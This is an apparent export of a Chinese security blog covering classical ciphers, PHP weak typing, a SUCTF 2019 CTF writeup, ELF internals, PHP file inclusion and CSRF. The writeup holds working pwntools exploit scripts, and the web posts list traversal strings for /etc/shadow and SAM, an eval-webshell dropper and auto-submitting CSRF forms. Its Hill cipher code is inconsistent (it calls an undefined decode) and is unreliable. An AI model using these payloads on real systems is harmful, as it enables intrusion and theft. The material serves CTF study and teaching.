用作加密的矩阵必须是可逆的,否则就不可能解码.只有矩阵的行列式和26互质,才是可逆的. 12345678910111213141516171819202122232425262728293031323334353637383940414243Dic = &#123;chr(i + 97):i for i in range(26)&#125;def encode(pwd, org): #decode temp = [] result = [] while True: if len(pwd) % 3 != 0: pwd.append(pwd[-1]) else: break for i in pwd: temp.append(Dic.get(i)) temp = array(temp) temp = temp.reshape(len(pwd) / 3, 3) xx = matrix(temp) * org for j in range(len(pwd) / 3): for i in range(3): if (int(xx[j, i]) &gt;= 26): result.append(chr(xx[j, i] % 26 + 97)) else: result.append(chr(xx[j, i] + 97)) return resultdef get_vmatrix(org): org_adjoin = org.I * linalg.det(org) org_det = int(str(abs(linalg.det(org))).split('.')[0]) for i in range(1, 26): if i * org_det % 26 == 1: break org_mod = -org_adjoin * i % 26 org_mod = matrix(org_mod) temp = [] for i in range(org_mod.shape[0]): for j in range(org_mod.shape[1]): temp.append(int(str(org_mod[i, j]).split('.')[0])) org_final = matrix(temp).reshape(org_mod.shape[0], org_mod.shape[1]) return org_final if __name__ == '__main__': pwd = "wjamdbkdeibr" org = get_vmatrix(matrix(array([[1, 2 ,3],[4, 5, 6],[7, 8, 10]]))) print "Your flag is :" + "".join(decode(list(pwd), org)) 猪圈密码 以格子为基础的简单替代式密码.传送门. 解密:http://ctf.ssleye.com/pigpen.html. Rabbit 加密解密链接. playfair密码 加密解密链接. 维吉尼亚密码 维吉尼亚密码是在单一恺撒密码的基础上扩展出多表代换密码,根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换,以此来对抗字频统计. 加密解密链接. 基于频率分析的维吉尼亚无密破解. 使用重合指数算法确定为维吉尼亚密钥长度. Porta密码 Porta密码(Porta Cipher)是一个多表代换密码,具有加密解密过程的是相同的特点. 12345678910111213141516#!shellKEYS| A B C D E F G H I J K L M N O P Q R S T U V W X Y Z----|----------------------------------------------------A,B | N O P Q R S T U V W X Y Z A B C D E F G H I J K L MC,D | O P Q R S T U V W X Y Z N M A B C D E F G H I J K LE,F | P Q R S T U V W X Y Z N O L M A B C D E F G H I J KG,H | Q R S T U V W X Y Z N O P K L M A B C D E F G H I JI,J | R S T U V W X Y Z N O P Q J K L M A B C D E F G H IK,L | S T U V W X Y Z N O P Q R I J K L M A B C D E F G HM,N | T U V W X Y Z N O P Q R S H I J K L M A B C D E F GO,P | U V W X Y Z N O P Q R S T G H I J K L M A B C D E FQ,R | V W X Y Z N O P Q R S T U F G H I J K L M A B C D ES,T | W X Y Z N O P Q R S T U V E F G H I J K L M A B C DU,V | X Y Z N O P Q R S T U V W D E F G H I J K L M A B CW,X | Y Z N O P Q R S T U V W X C D E F G H I J K L M A BY,Z | Z N O P Q R S T U V W X Y B C D E F G H I J K L M A 明文:THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG. 密钥(循环使用，密钥越长相对破解难度越大):CULTURE. 加密过程:明文字母T列与密钥字母C行交点就是密文字母F,以此类推. 密文:FRW HKQRY YMFMF UAA OLWHD ALWI JPT ZXHC NGV. 已知密钥在线加解密 破解:Porta密码可以被和维吉尼亚密码破解相类似方式进行自动攻破.]]></content>
      <categories>
        <category>IS</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>古典密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-PHP-弱类型]]></title>
    <url>%2Fposts%2F5a6e2276%2F</url>
    <content type="text"><![CDATA[概览 PHP弱类型导致的漏洞主要来源于类型转换和内置函数对于传入错误类型的参数时的错误处理. 自动类型转换 在PHP中变量是以C语言的结构体来存储的,空字符串,NULL,false都是以0存储.这个结构体有个zend_uchartype成员变量,用来保存变量的类型. 不同类型的变量进行比较的时候就会存在类型转换比较其值.当其中一个变量为整数时,会把另一个变量强制转化为整数,相当于intval函数. 12340 == '0' //true0 == 'abcdefg' //true1 == '1abcdef' //true#==比较值,===既比较类型也比较值. 字符串以0e\d+开头时会被解析为科学计数法(例如hash值比较). 字符串以0x开头时会被解析为十六进制(例如hash值比较). 内置函数 md5(),其参数为string,但参数为array时其并不会报错,返回0,所以任意2个array的md5()返回值都一样. strcmp(),当其中有参数为数字时就会返回null. switch(),会将参数强制转化为整数. in_array:在strict参数没提供的情况下进行的是松散比较. 还有其他函数也会在参数传递过程中发送例如字符串与整数间的转化,也可能会导致bypass或其他漏洞.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-suctf-2019]]></title>
    <url>%2Fposts%2Fb0cce827%2F</url>
    <content type="text"><![CDATA[pwn playfmt 发现栈中留有栈指针和堆指针,通过%?$n修改栈指针的值使其指向堆指针,再修改堆指针偏移指向堆中的flag,%s打印即可. 123456789101112131415161718192021222324252627282930313233343536from pwn import *#context.log_level = 'debug'#r = process("./playfmt")r = remote("120.78.192.35", "9999")r.recvuntil("=====================\n")r.recvuntil("=====================\n")payload = "%18$p\n%6$p\nmvp"r.send(payload)heap = int(r.recvuntil("\n"), 16) - 0x18stack = int(r.recvuntil("\n"), 16)print "heap: " + hex(heap)print "stack: " + hex(stack)r.recvuntil("mvp")payload = "%" + str((stack % 0x100) + 0x10) + "d%6$hhnmvp"r.send(payload)r.recvuntil("mvp")payload = "%16d%14$hhnmvp"r.send(payload)r.recvuntil("mvp")payload = "%18$smvp"r.send(payload)print r.recvuntil("mvp")[:-3]#gdb.attach(r) 二手破电脑 rename的解密脚本. 123456789101112131415#include&lt;stdio.h&gt;int main() &#123; char buf[9] = &#123;0&#125;; char key[9] = "Qf(&gt;qwd!"; buf[7] = '!'; for(int i = 6;i &gt;= 0;i--) &#123; for(;;buf[i]++) &#123; if((((buf[i] | buf[i + 1]) &amp; ~(buf[i] &amp; buf[i + 1]) | i) &amp; ~((buf[i] | buf[i + 1]) &amp; ~(buf[i] &amp; buf[i + 1]) &amp; i)) == key[i]) &#123; break; &#125; &#125; &#125; puts(buf);&#125; comment时未封闭字符串,throwaa泄露heap和leak.perchase存在off-by-one.堆重叠后进行fastbin attack控制部分堆区,修改堆指针. rename两次修改,首先将堆指针改为指向free_hook,再修改free_hook为system.getshell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from pwn import *context(os="linux", arch="amd64")context.log_level = 'debug'def perchase(size, name, price): r.sendline('1') r.sendlineafter('Name length: ', str(size)) r.sendafter('Name: ', name) r.sendlineafter('Price: ', str(price)) r.recvuntil('&gt;&gt;&gt; ')def comment(index, content, score): r.sendline('2') r.sendlineafter('Index: ', str(index)) r.send(content) r.sendlineafter('And its score: ', str(score)) r.recvuntil('&gt;&gt;&gt; ')def throwaa(index): r.sendline('3') r.sendlineafter('your index: ', str(index)) data = r.recvuntil('&gt;&gt;&gt; ') return datadef rename(index, content, xss): r.sendline('4') r.sendlineafter('Give me an index: ', str(index)) r.send(content) r.sendlineafter('Wanna get more power?(y/n)', 'y') r.sendlineafter('Give me serial: ', 'e4SyD1C!') r.sendlineafter('Hey Pwner', xss)#r = process('./pwn')r = remote("47.111.59.243", "10001")r.recvuntil('&gt;&gt;&gt; ')perchase(0xa0, "a" * 0xa0, 0x40)#0comment(0, "a" * 0x8c, 0x40)perchase(0xa0, "a" * 0xa0, 0x40)#1comment(1, "a" * 0x8c, 0x40)throwaa(0)perchase(0xa0, "a" * 0xa0, 0x40)#0comment(0, "a" * 1, 0x40)libc = u32(throwaa(0)[12:16]) - 0x1b07b0throwaa(1)perchase(0x140, "a" * 0x140, 0x400)#0comment(0, "a" * 1, 0x40)heap = u32(throwaa(0)[8:12]) - 0x61fake = "/bin/sh\x00" * 9 + "a" * 0xf0 + p32(0) + p32(0x161 - 0x138 + 0x190) + p32(0) + p32(0x41);perchase(0x148, fake, 0x40)#0#leak libc &amp; heapperchase(0x10, "a" * 0x10, 0x40)#1perchase(0x10, "a" * 0x10, 0x40)#2perchase(0x10, "a" * 0x10, 0x40)#3throwaa(1)throwaa(2)throwaa(3)#6perchase(0x3b, "a" * 0x3b, 0x40)#1perchase(0x188, p32(0x100) * (0x188 / 4), 0x40)#2perchase(0x40, "a" * 0x40, 0x40)#3perchase(0x40, "a" * 0x40, 0x40)#4throwaa(2)throwaa(1)perchase(0x3c, "a" * 0x3c, 0x40)#1perchase(0xb8, "a" * 0xb8, 0x40)#2perchase(0x38, "a" * 0x38, 0x40)#5throwaa(2)throwaa(3)throwaa(5)perchase(0x1d0, "a" * 0xb8 + p32(0) + p32(0x41) + p32(heap + 0x178) + "a" * 0x10c, 0x40)#2perchase(0x38, "a" * 0x38, 0x40)#3fake = p32(0x150) + p32(0x19) + p32(0) + p32(heap + 0x38)fake += p32(0x40) * 2 + p32(0) + p32(0x19) + p32(0) + p32(heap + 0x178) + p32(0x40) + p32(0) * 2fake += p32(0x19)perchase(0x38, fake, 0x40)#5#fastbin attackr.sendline('4')r.sendlineafter('Give me an index: ', str(2))fake = p32(0x150) + p32(0x19) + p32(0) * 3 + p32(heap + 0x38)fake += p32(libc + 0x1b18b0) * 10r.send(fake)r.sendlineafter('Wanna get more power?(y/n)', 'y')r.sendlineafter('Give me serial: ', 'e4SyD1C!')r.sendlineafter('Hey Pwner', p32(libc + 0x3a940))print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive() babystack 主函数没有漏洞,通过IDA的Strings窗口进行交叉引用发现漏洞函数sub_407F60. 发现套路和hitb-gsec-2017的babystack很像,修改payload即可. 这里触发异常需要利用这段汇编,只要esi为0即可触发除0异常,实际上就是让输入等于返回地址. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwintools import *r = Process("babystack.exe")r.recvuntil("stack address = 0x")stack = int(r.recvline()[:-2], 16)r.recvuntil("main address = 0x")main = int(r.recvline()[:-2], 16)print "stack: " + hex(stack)print "main: " + hex(main)r.recvline()r.sendline(hex(main - 0x395e + 0x8551))r.recvline()r.recvline()r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack - 0x30))seh_next = int(r.recvline().split("0x")[2], 16) print "seh_next: " + hex(seh_next)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack - 0x2c))seh_handle = int(r.recvline().split("0x")[2], 16) print "seh_handle: " + hex(seh_handle)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(main - 0x395e + 0x7c004))security_cookie = int(r.recvline().split("0x")[2], 16) print "security_cookie: " + hex(security_cookie)fake_scope_table = security_cookie ^ (stack - 0x7c)print "fake_scope_table: " + hex(fake_scope_table)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack - 0x3c))check = int(r.recvline().split("0x")[2], 16) print "check: " + hex(check)r.recvline()r.sendline("go")payload = ""payload += "a" * 0x50payload += "\xe4\xff\xff\xff" + p32(0) + "\x0c\xff\xff\xff" + p32(0)payload += "\xfe\xff\xff\xff" + p32(main - 0x395e + 0x8224) + p32(main - 0x395e + 0x8266)payload += "a" * 0x24payload += p32(check) + "a" * 8 + p32(seh_next) + p32(seh_handle) + p32(fake_scope_table) + p32(0) + p32(stack)#这里注意要修改ebp,触发正确的异常处理函数r.sendline(payload)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(0))r.interactive() Reverse Signin 加密过程为RSA,解密即可. 12345d = 91646299298871237857836940212608056141193465208586711901499120163393577626813e = 65537n = 103461035900816914121390101299049044413950405173712170434161686539878160984549p = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419 输入v8.sub_96A实际就是将hex转ASCII. 12345678910111213141516171819202122sub_96A(&amp;v8, (__int64)&amp;v9);//v9 = 0x73756374667b50776e5f405f68756e647265645f79656172737d;//suctf&#123;Pwn_@_hundred_years&#125;//byte_202010: 30h, 31h, 32h, 33h, 34h, 35h, 36h, 37h, 38h, 39h, 61h, ...size_t __fastcall sub_96A(const char *a1, __int64 a2)&#123; size_t result; // rax int v3; // [rsp+18h] [rbp-18h] int i; // [rsp+1Ch] [rbp-14h] v3 = 0; for ( i = 0; ; i += 2 ) &#123; result = strlen(a1); if ( v3 &gt;= result ) break; *(_BYTE *)(a2 + i) = byte_202010[(char)(a1[v3] &gt;&gt; 4)]; *(_BYTE *)(a2 + i + 1LL) = byte_202010[a1[v3++] &amp; 0xF]; &#125; return result;&#125; crypto MT 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from Crypto.Random import randomfrom Crypto.Util import number#from flag import flagdef convert(m): m = m ^ m &gt;&gt; 13 m = m ^ m &lt;&lt; 9 &amp; 2029229568 m = m ^ m &lt;&lt; 17 &amp; 2245263360 m = m ^ m &gt;&gt; 19 return mdef revert(m): m = m ^ m &gt;&gt; 19 m = m ^ m &lt;&lt; 17 &amp; 0b10000101110101000000000000000000 m = m ^ m &lt;&lt; 9 &amp; 0b00000000000000111001011000000000 m = m ^ m &lt;&lt; 9 &amp; 0b00000000111100000000000000000000 m = m ^ m &lt;&lt; 9 &amp; 0b01111000000000000000000000000000 m = m ^ m &gt;&gt; 13 &amp; 0b00000000000001111111111111000000 m = m ^ m &gt;&gt; 13 &amp; 0b00000000000000000000000000111111 return mdef transform(message): assert len(message) % 4 == 0 new_message = '' for i in range(len(message) / 4): block = message[i * 4 : i * 4 +4] block = number.bytes_to_long(block) block = convert(block) block = number.long_to_bytes(block, 4) new_message += block return new_messagedef detranform(message): assert len(message) % 4 == 0 new_message = '' for i in range(len(message) / 4): block = message[i * 4 : i * 4 +4] block = number.bytes_to_long(block) block = revert(block) block = number.long_to_bytes(block, 4) new_message += block return new_messagetransformed_flag = "641460a9e3953b1aaa21f3a2"flag = detranform(transformed_flag.decode('hex')).encode('hex')print 'flag&#123;' + flag + '&#125;'#flag&#123;84b45f89af22ce7e67275bdc&#125; MISC 签到题 附件打开后,很显然是base64加密文件,由于一般字符串加密不会出现+/符号,所以猜测是图片加密,对比一个以往的图片转base64的题目,发现本题与那题开头字符串一致,所以猜测是jpg加密,在开头补上data:imge/jpg;bae64,,然后在线解密一下就得到原有图片了.原图即是flag.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-algorithm-动态连通性]]></title>
    <url>%2Fposts%2Fd03e2517%2F</url>
    <content type="text"><![CDATA[概念 一个集合可以被一种等价关系分为多个等价类,比如两个点的相连关系可以将一个点集分为多个相连的点集(连通分量),将这种判断是否连通并更新对应连通分量的问题称为动态连通性问题. 动态连通性问题解决思路:给每一个连通分量选择一个不同的标识符(用于判断等价关系的值或者说id),通过检索标识符并判断是否相等来判断连通性. 第一种解决方案:所有同一连通分量中的点都保存标识符,检索过程只需要一次即可,但是合并连通分量时就要遍历点集将每一个点的标识符改变. 第二种解决方案:如果一个点只保存自己链接的点,初始链接自己,合并只改变一个点的链接,而检索过程只需要沿链接向上找到根链接点(根链接点的标识是链接自己).实际上将关系变成了森林,对于合并时谁作为父节点,通过比较前连通分量的结点数实现加权算法. 这两种方法中,前者合并比较困难,后者检索比较困难. Java实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class UF &#123; private int[] id; private int count; public UF(int N) &#123; count = N; id = new int[N]; for (int i = 0; i &lt; N; i++) &#123; id[i] = i; &#125; &#125; public int count() &#123; return count; &#125; public boolean connected(int p, int q) &#123; // 判断是否属于同一连通分量 return find(p) == find(q); &#125; /* 对所有同一连通分量中的点都保存同一标识符 */ public int find(int p) &#123; return id[p]; &#125; public void union(int p, int q) &#123; int pID = find(p); int qID = find(q); if (pID == qID) return; for (int i = 0; i &lt; id.length; i++) &#123; // 遍历修改标识符 if(id[i] == pID) id[i] = qID; &#125; count--; &#125; /* 一个点只保存自己链接的点 */ public int find(int p) &#123; // 获取根结点 while (p != id[p]) p = id[p]; return p; &#125; public void union(int p, int q) &#123; int pRoot = find(p); int qRoot = find(q); if (pRoot == qRoot) return; // 改变根结点合并连通分量 id[pRoot] = qRoot; count--; &#125;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-Linux-ELF]]></title>
    <url>%2Fposts%2F5c8aef2%2F</url>
    <content type="text"><![CDATA[概览 (ELF)[https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf],即Executable and Linking Format(可执行可连接格式),具有这种格式的文件称为ELF文件. ELF文件主要分为以下三种类型. 可重定位文件(relocatable file):用于与其它目标文件进行连接以构建可执行文件或动态链接库.可重定位文件就是常说的目标文件,由源文件编译而成,但还没有连接成可执行文件.在UNIX系统下,一般有扩展名.o. 共享目标文件(shared object file):即动态连接库文件.它在以下两种情况下被使用:在连接过程中与其它动态链接库或可重定位文件一起构建新的目标文件;在可执行文件被加载的过程中被动态链接到新的进程中成为运行代码的一部分. 可执行文件(executable file):经过连接的,可以执行的程序文件. 文件格式 从连接的角度和运行的角度,可以分别把目标文件的组成部分做以下的划分. ELF文件头位于文件的最开始处,包含有整个文件的结构信息. 节(section)是专用于连接过程而言的,在每个节中包含有指令数据,符号数据,重定位数据等等. 程序头表(program header table)在运行过程中是必须的,在连接过程中是可选的,因为它的作用是告诉系统如何创建进程的镜像. 节头表(section header table)包含有文件中所有节的信息.在连接视图中,节头表是必须存在的,文件里的每一个节都需要在节头表中有一个对应的注册项,这个注册项描述了节的名字,大小等等. ELF文件头 1234567891011121314151617#define EI_NIDENT 16typedef struct &#123; unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125; Elf32_Ehdr; e_ident字符数组是ELF标识,即ELF文件头结构最开始的16个字节,作为一个数组,它的各个索引位置的字节数据有固定的含义. e_type表明本目标文件属于哪种类型.e_machine指定该文件适用的处理器体系结构.e_version指明目标文件的版本.e_entry指明程序入口的虚拟地址. e_phoff指明程序头表在文件中的偏移量.e_shoff指明节头表在文件中的偏移量.e_flags字段含有处理器特定的标志位.e_ehsize表明ELF文件头的大小. e_phentsize表明在程序头表中每一个表项的大小,以字节为单位.e_phnum表明程序头表中总共有多少个表项. e_shentsize表明在节头表中每一个表项的大小,以字节为单位.e_shnum表明节头表中总共有多少个表项. e_shstrndx节头表中与节名字表相对应的表项的索引,没有节名字表,此值应设置为SHN_UNDEF. 可以使用file工具与readelf -h解析数据. 节 在目标文件中可以包含很多节(section),都登记在节头表(section header table)这个数组里.节头表的表项是Elf32_Shdr结构,通过每一个表项可以定位到对应的节. 目标文件中的每一个节一定对应有一个节头(section header),节头中有对节的描述信息;但有的节头可以没有对应的节,而只是一个空的头. 每一个节所占用的空间是连续的,各个节之间不会互相重叠,节与节之间可能会存在一些多余的字节,这些字节不属于任何节. 123456789101112typedef struct &#123; Elf32_Word sh_name; Elf32_Word sh_type; Elf32_Word sh_flags; Elf32_Addr sh_addr; Elf32_Off sh_offset; Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign; Elf32_Word sh_entsize;&#125; Elf32_Shdr; sh_name为节名,字符串并不存储在这里,储存的是索引号,指向字符串表节中的某个位置,那里存储了一个字符串. sh_type指明节的类型. - 0-&gt;SHT_NULL:无效的节头. - 1-&gt;SHT_PROGBITS:本节信息由程序定义的. - 2-&gt;SHT_SYMTAB/11-&gt;SHT_STRTAB:这两类节含有符号表,目标文件最多只能各包含一个这两种节.SHT_SYMTAB提供的符号用于在创建目标文件的时候编译链接,运行期间也有可能用于动态连接,其包含完整的符号表.而SHT_DYNSYM节有一个较小的符号表,专门用于动态连接. - 3-&gt;SHT_STRTAB:表明本节是字符串表,目标文件可以包含多个字符串表节. - 4-&gt;SHT_RELA/9-&gt;SHT_REL:都表明本节是重定位节,含有带明确加数的重定位项.前者加数为Elf32_Rela,后者为Elf32_Rel. - 5-&gt;SHT_HASH:表明本节包含哈希表,参与动态连接的目标文件都必须包含一个符号哈希表,目前目标文件中最多一个哈希表. - 6-&gt;SHT_DYNAMIC:表明本节包含动态连接信息,目前目标文件中最多一个. - 7-&gt;SHT_NOTE:表明本节包含的信息用于以某种方式来标记本文件. - 8-&gt;SHT_NOBITS:表明本节的内容为空,不占实际空间,sh_offset只代表一个逻辑上的位置概念. - 10-&gt;SHT_SHLIB:保留值. - 0x70000000-&gt;SHT_LOPROC/0x7fffffff-&gt;SHT_HIPROC:为特殊处理器保留的节类型索引值的下/上界. - 0x80000000-&gt;SHT_LOUSER/0xffffffff-&gt;SHT_HIUSER:为应用程序保留的节类型索引值的下/上界. sh_flags由一系列标志比特位组成,各个比特定义了节的不同属性,存在该属性设为1,反之则设为0. - 0x1-&gt;SHF_WRITE:表示本节所包含的内容在进程运行过程中是可写的. - 0x2-&gt;SHF_ALLOC:表示本节内容在进程运行过程中要占用内存单元. - 0x4-&gt;SHF_EXECINSTR:表示此节内容是指令代码. - 0xf0000000-&gt;SHF_MASHPROC:被此值所覆盖的位都是保留做特殊处理器扩展用的. 如果本节的内容需要映射到进程空间中去,sh_addr指定映射的起始地址,不需要映射则为0. sh_offset指明本节位置,该值是节的第一个字节在文件中的位置.sh_size指明节的大小.sh_addralign指明本节对齐字节,该值为0或1表明没有对齐约束,否则应该为2的正整数倍. sh_link和sh_info根据节的类型不同表示不同的意义. 可以使用readelf -S解析数据. 段 可执行文件或共享目标文件的程序头表(program header table)是一个数组,数组中的每一个元素称为程序头(program header),每一个程序头描述了一个段(segment)或者一块用于准备执行程序的信息.程序头只对可执行文件或共享目标文件有意义. 12345678910typedef struct &#123; Elf32_Word p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; Elf32_Word p_filesz; Elf32_Word p_memsz; Elf32_Word p_flags; Elf32_Word p_align;&#125; Elf32_Phdr; p_type为本程序头所描述的段的类型. - 0-&gt;PT_NULL:无效的程序头. - 1-&gt;PT_LOAD:本程序头指向一个可装载的段,段的内容会被从文件中拷贝到内存中. - 2-&gt;PT_DYNAMIC:本段指明了动态连接的信息. - 3-&gt;PT_INTERP:指向了一个字符串,是一个ELF解析器的路径.只对可执行程序有意义,最多只能出现一次,而且必须出现在其它可装载段的表项之前. - 4-&gt;PT_NOTE:指向了一个字符串,包含一些附加的信息. - 5-&gt;PT_SHLIB:该段类型是保留的. - 6-&gt;PT_PHDR:表明的是其自身所在的程序头表在文件或内存中的位置和大小.这样的段在文件中可以不存在,只有当所在程序头表所覆盖的段只是整个程序的一部分时,才会出现一次这种表项,而且这种表项一定出现在其它可装载段的表项之前. - 0x70000000-&gt;PT_LOPROC ~ 0x7fffffff-&gt;PT_HIPROC:为特定处理器保留. p_offset给出本段内容在文件中的位置.p_vaddr给出本段内容的开始位置在进程空间中的虚拟地址.p_paddr给出本段内容的开始位置在进程空间中的物理地址,现在大多无用. p_filesz给出本段内容在文件中的大小.p_memsz给出本段内容在内容镜像中的大小.p_flags给出了本段内容的属性.p_align给出本段装载的对齐值. 程序头中出现的虚拟地址不能代表其相应的数据在进程内存空间中的虚拟地址(ASLR),只能体现出相对偏移. p_flags:PF_X-&gt;0x1表示可执行属性,PF_W-&gt;0x2表示写属性,PF_R-&gt;0x4表示读属性,PF_MASKPROC-&gt;0xf0000000所覆盖的权限值(4个)是为特殊处理器保留.]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-PHP-文件包含漏洞]]></title>
    <url>%2Fposts%2F102663db%2F</url>
    <content type="text"><![CDATA[原理 服务器执行PHP文件时,可以通过文件包含函数加载另一个文件中的PHP代码来执行. PHP中文件包含函数有以下四种. 1234require()require_once()include()include_once() include在包含的过程中如果出现错误,会抛出一个警告,程序继续正常运行;而require函数出现错误的时候,会直接报错并退出程序的执行. 而include_once(),require_once()这两个函数与前两个的不同之处在于这两个函数只包含一次,以避免函数重定义,变量重新赋值等问题. 漏洞实例 文件包含函数加载的参数没有经过过滤或者严格的定义,可以被用户控制,包含其他恶意文件,导致了执行了非预期的代码. 1234&lt;?php $filename = $_GET['filename']; include($filename);?&gt; 本地文件包含漏洞 Local File Inclusion(LFI). 123456&lt;?php $file = $_GET['file']; if (file_exists('/home/wwwrun/'.$file.'.php')) &#123; include '/home/wwwrun/'.$file.'.php'; &#125;?&gt; %00截断,?file=../../../../../../../../../etc/passwd%00读取/etc/passwd.需要magic_quotes_gpc=off,PHP小于5.3.4有效. 路径长度截断,?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././..Linux需要文件名长于4096,Windows需要长于256. 点号截断,?file=../../../../../../../../../boot.ini/………[…]………….只适用Windows,点号需要长于256. 常见的敏感信息路径 Windows系统. 123456789101112c:\boot.ini# 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml# IIS配置文件c:\windows\repair\sam# 存储Windows系统初次安装的密码c:\ProgramFiles\mysql\my.ini# MySQL配置c:\ProgramFiles\mysql\data\mysql\user.MYD# MySQL root密码c:\windows\php.ini# php 配置信息 Linux/Unix系统. 12345678910111213141516/etc/passwd# 账户信息/etc/shadow# 账户密码文件/usr/local/app/apache2/conf/httpd.conf# Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf# 虚拟网站配置/usr/local/app/php5/lib/php.ini# PHP相关配置/etc/httpd/conf/httpd.conf# Apache配置文件/etc/my.conf# mysql配置文件/proc/self/environ# 存储user-agent的值 远程文件包含漏洞 Remote File Inclusion(RFI).PHP的配置文件allow_url_fopen和allow_url_include设置为ON,include/require等包含函数可以加载远程文件. 123&lt;?php include($_GET['filename'] . ".html");?&gt; 可以使用?,#,绕过后缀. PHP伪协议 PHP带有很多内置URL风格的封装协议,可用于部分文件系统函数. php://filter 条件:需要开启allow_url_include,不需要开启allow_url_fopen. php://filter(本地磁盘文件进行读取). 用法:?filename=php://filter/convert.base64-encode/resource=xxx.php,同?filename=php://filter/read=convert.base64-encode/resource=xxx.php. php://input 条件:需要开启allow_url_fopen,不需要开启allow_url_include. php://input用于访问请求的原始数据的只读流.即直接读取到POST上没有经过解析的原始数据.enctype="multipart/form-data"时无效. 用法:?file=php://input,数据利用POST传过去; 可以使用file_get_contents("php://input")读取post数据. 1234&lt;?php $filename = $_GET['filename']; include($filename);?&gt; 如果php配置文件中同时开启allow_url_fopen和allow_url_include(PHP &lt; 5.3.0),就可以造成任意代码执行. 可以理解成远程文件包含漏洞,即POST过去PHP代码然后执行. 例如POST数据为&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;就会在当前目录下写入木马. data:// 条件:需要开启allow_url_include,不需要开启allow_url_fopen. 数据流封装器,和php://相似都是利用了流的概念,将原本文件流重定向到了用户可控制的输入流中,和php伪协议的php://input类似. 用法:data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-CSRF-攻击]]></title>
    <url>%2Fposts%2Ff67ac66c%2F</url>
    <content type="text"><![CDATA[概览 CSRF攻击的本质是攻击者能知道某个操作的所有参数,通过构造url让受害者访问从而伪造请求. 使用 CSRF常使用标签的src跳转,如:&lt;img&gt;,&lt;script&gt;,&lt;iframe&gt;. 或者使用JS方法等等. 1234&lt;script&gt; var foo = new Image(); foo.src = url.&lt;/script&gt; 针对GET和POST有不同类型的payload. GET. 1&lt;img src='http://www.bug.com/get.php?do=20'&gt; POST. 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;index&lt;/title&gt; &lt;script type="text/javascript"&gt; function csrf() &#123; window.frames['aaa'].document.forms[0].submit(); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body onload="csrf()"&gt; &lt;iframe name="aaa" display="none" src="./csrf.html"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt; csrf.html. 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;csrf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form display="none" action="http://www.bug.com/post.php" method="post" &gt; &lt;input type="hidden" name="do" value="20"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; JSON Hijacking JSON是JavaScript的子集,一种轻量化的数据交换格式,实际上就是键值对. JSON Hijacking实际上就是利用CSRF漏洞盗取用户在漏洞网站的铭感信息. 绕过Referer CSRF绕过Referer的情况,需要看后端对Referer的限制. 使Referer为空 利用data协议使Referer为空. 12345&lt;html&gt; &lt;body&gt; &lt;iframe src="data:text/html;base64,aHR0cHM6Ly9idWcuY29tL2F0dGFjay5waHA="&gt; &lt;/body&gt; &lt;/html&gt; 在通过跨协议调用js时,发送的http请求里Referer为空. 1&lt;iframe src="https://bug.com/attack.php"&gt; 判断Referer是某域 利用二级域名. 判断Referer是否存在关键字 在网站新建一个关键字目录,把CSRF存放在该目录即可. 判断referer是否含有某域名 例如126.com.可以构造子域名x.126.com.xxx.com作为载体服务器.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-fuzz-AFL-使用]]></title>
    <url>%2Fposts%2F98e6ff36%2F</url>
